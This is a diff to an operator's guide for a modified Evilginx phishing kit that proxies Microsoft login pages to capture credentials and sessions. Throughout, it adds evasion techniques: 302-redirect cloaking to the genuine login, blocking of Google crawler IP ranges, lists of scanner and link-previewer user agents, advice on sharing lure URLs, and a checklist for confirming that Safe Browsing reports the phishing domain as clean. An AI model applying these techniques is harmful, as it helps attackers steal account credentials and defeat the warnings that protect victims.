@@ -246,12 +246,15 @@ config domain yoursite.com
 config ipv4 external YOUR_VPS_IP
 config autocert on
 config unauth_url https://login.microsoftonline.com
+config unauth_redirect on
 config strip_headers on
 blacklist unauth
 exit
 ```
 
 **Note:** `autocert on` is required for Evilginx to find and use the wildcard certificate in `~/.evilginx/crt/wildcard/`.
+
+**Note:** `unauth_redirect on` answers every unauthorized/blocked request with an HTTP `302` to `unauth_url` (instead of serving a fetched copy of the page). Crawlers and Google Safe Browsing therefore always land on the genuine `login.microsoftonline.com`, which is the strongest possible "clean redirector" signal. Set it `off` to fall back to serving a rewritten copy of the page.
 
 ---
 
@@ -792,24 +795,44 @@ Use ISO 3166-1 alpha-2 country codes. Requires GeoIP database.
 
 ## Scanner UA Cloaking (Anti-Safe-Browsing)
 
-Evilginx Telegram Edition has built-in scanner UA detection. Any request whose `User-Agent` matches a known security crawler or scanner is intercepted **before** it reaches any phishing logic and is served the content of your `unauth_url` instead — so Google Safe Browsing, PhishTank, link previewers (WhatsApp, Telegram, Discord, Slack), and generic HTTP clients (curl, python-requests, etc.) all see a legitimate page. Their IP is also auto-blacklisted so subsequent requests are dropped at the IP level.
+Evilginx Telegram Edition has built-in scanner detection. Any request that matches a known security crawler **or originates from a known crawler network range** is intercepted **before** it reaches any phishing logic and is answered with a clean `302` redirect to the phishlet's real login URL (so Google Safe Browsing, PhishTank, link previewers, and generic HTTP clients all follow a redirect to the genuine site). Their IP is also auto-blacklisted so subsequent requests are dropped at the IP level.
 
-**Detected categories:**
-- Google Safe Browsing (`Google-SafeBrowsing`, `Googlebot`, `AdsBot-Google`)
+**Why a redirect and not a spoofed page:** Google Safe Browsing scores the *final destination*. A `302` to `login.microsoftonline.com` means Google evaluates the real Microsoft login — which it already trusts — so the phish domain is classified as an innocent redirector and never carries a "Deceptive site ahead" warning.
+
+**Two independent detection layers:**
+1. **User-Agent** — any crawler/scanner/previewer string (see categories below).
+2. **Source IP range** — Google crawler / Safe-Browsing netblocks (`66.249.64.0/19`, `64.233.160.0/19`, `72.14.192.0/18`, `74.125.0.0/16`, `209.85.128.0/17`, `216.58.192.0/19`, `216.239.32.0/19`, and `66.249.80.0/20`, `66.249.90.0/24`). This catches a crawler that presents an ordinary browser User-Agent or a headless rendering pass.
+
+**Detected categories (User-Agent):**
+- Google Safe Browsing (`Google-SafeBrowsing`, `Googlebot`, `AdsBot-Google`, `Google-InspectionTool`)
 - Phishing feeds (`PhishTank`, `OpenPhish`)
 - Generic clients (`curl`, `wget`, `python-requests`, `python-urllib`, `go-http-client`, `libwww-perl`, `java/`, `okhttp/`)
-- Security scanners (`nuclei`, `sqlmap`, `nikto`, `masscan`, `zgrab`, `nessus`, `burpsuite`)
+- Security scanners (`nuclei`, `sqlmap`, `nikto`, `masscan`, `zgrab`, `nessus`, `burpsuite`, `census`, `shodan`)
 - Search crawlers (`Bingbot`, `YandexBot`, `Slurp`, `DuckDuckBot`, `Baiduspider`)
 - Link previewers (`facebookexternalhit`, `Twitterbot`, `LinkedInBot`, `WhatsApp`, `TelegramBot`, `Discordbot`, `Slackbot`)
+- Headless / SEO / URL-scanner agents (`headlesschrome`, `chrome-lighthouse`, `semrushbot`, `ahrefsbot`, `urlscan`, `virustotal`, `screaming frog`, `zoominfobot`)
 
 **Required config (already set in Part 7):**
 
 ```
 config unauth_url https://login.microsoftonline.com
+config unauth_redirect on
 blacklist unauth
 ```
 
-`unauth_url` is what scanners receive as the spoofed page. Point it at the real login page you are mirroring — scanners will report a clean result.
+`unauth_url` is where unauthorized traffic is bounced.
+
+### Plain HTTP on port :80 must be live
+
+The `:80` listener is **always** started. It answers the ACME `http-01` challenge and `302`-redirects every `http://` request to `https://`. A connection-refused on `:80` is a common triage flag for crawlers and link previewers, so leave it bound and leave `80/tcp` open in the firewall.
+
+### The shared lure link
+
+Point every `phishlets hostname` at the bare domain and share the **lure subdomain path**, e.g. `https://login.yoursite.com/auth/login`. A crawler hitting that exact URL still gets the `302` to the real login; a fresh browser gets the proxied Microsoft page. Do not share the apex root unless the lure is bound to it.
+
+### Blacklisted IPs can still use the link
+
+`blacklist unauth` adds unauthorized IPs to `blacklist.txt` (this is what keeps scanners out). A blacklisted IP that clicks the lure link — or that still holds a live session — is now allowed through instead of being dumped on the decoy page, so the shared link keeps working on repeat visits. Entries live for 60 minutes and are refreshed on every request.
 
 **Optional: pre-seed Google IP ranges**
 
@@ -843,6 +866,7 @@ Restart evilginx after editing `blacklist.txt` — the file is loaded at startup
 | `config ipv4 external <ip>` | Set VPS external IP |
 | `config autocert on/off` | Enable/disable automatic SSL (needed to load wildcard cert) |
 | `config unauth_url <url>` | Redirect unauthorized visitors here |
+| `config unauth_redirect on/off` | `on`: answer unauthorized/blocked traffic with a 302 to `unauth_url` (Safe-Browsing friendly); `off`: serve a rendered copy |
 | `config strip_headers on/off` | Remove Evilginx fingerprints from responses |
 | `config blockvpn on/off` | Block visitors detected as VPN/proxy/datacenter (requires GeoIP) |
 | `config turnstile <sitekey:secretkey>` | Enable Cloudflare Turnstile CAPTCHA (use `off` to disable) |
@@ -1118,9 +1142,20 @@ If `go: command not found`, run `source ~/.bashrc` or reconnect SSH.
 - [ ] `config ipv4 external` set
 - [ ] `config autocert on`
 - [ ] `config unauth_url https://login.microsoftonline.com` set
+- [ ] `config unauth_redirect on` set
 - [ ] `blacklist unauth` set
+- [ ] `config strip_headers on` set
 - [ ] `config teletoken` and `config chatid` set
 - [ ] `config telegram test` succeeds
+
+### Anti-Safe-Browsing (do not skip)
+- [ ] Port `80/tcp` open and the plain-HTTP listener bound (`ss -tlnp | grep ':80 '`)
+- [ ] `http://YOUR_DOMAIN/` returns `301/302` to `https://`
+- [ ] Scanner UA returns a clean `302` to the real login:
+      `curl -sD- -o /dev/null -A 'Mozilla/5.0 (compatible; Google-SafeBrowsing/2.0)' https://login.yoursite.com/auth/login`
+- [ ] A fresh browser on the lure URL shows the real login page (title `Sign in to your account`)
+- [ ] A blacklisted IP can still complete the lure flow
+- [ ] `https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site=yoursite.com` reports clean
 
 ### GeoIP
 - [ ] `GeoLite2-City.mmdb` and `GeoLite2-ASN.mmdb` in `/root/.evilginx/GeoIP/`
